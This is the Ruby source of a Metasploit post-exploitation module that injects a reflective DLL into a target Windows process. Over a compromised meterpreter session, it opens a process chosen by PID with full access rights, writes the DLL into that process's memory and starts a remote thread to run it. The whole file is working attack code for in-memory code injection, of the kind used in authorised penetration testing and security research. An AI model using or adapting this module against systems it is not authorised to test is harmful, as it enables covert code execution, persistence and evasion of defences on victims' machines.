##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/post/windows/reflective_dll_injection'

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::ReflectiveDLLInjection

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Reflective DLL Injection Module',
      'Description'   => %q{
        This module will inject into the memory of a process a specified Reflective DLL.
      },
      'License'      => MSF_LICENSE,
      'Author'       => [ 'Ben Campbell'],
      'Platform'     => [ 'win' ],
      'SessionTypes' => [ 'meterpreter' ],
      'References'   =>
        [
          [ 'URL', 'https://github.com/stephenfewer/ReflectiveDLLInjection' ]
        ]
    ))

    register_options(
      [
        OptPath.new('PATH',[true, 'Reflective DLL to inject into memory of a process.']),
        OptInt.new('PID',[true, 'Process Identifier to inject of process to inject payload.']),
      ])
  end

  # Run Method for when run command is issued
  def run
    # syinfo is only on meterpreter sessions
    print_status("Running module against #{sysinfo['Computer']}") if not sysinfo.nil?

    pid = datastore['PID'].to_i
    host_process = client.sys.process.open(pid, PROCESS_ALL_ACCESS)

    print_status("Injecting #{datastore['PATH']} into #{pid} ...")
    dll_mem, offset = inject_dll_into_process(host_process, datastore['PATH'])

    print_status("DLL injected. Executing ReflectiveLoader ...")
    host_process.thread.create(dll_mem + offset, 0)
    print_good("DLL injected and invoked.")
  end
end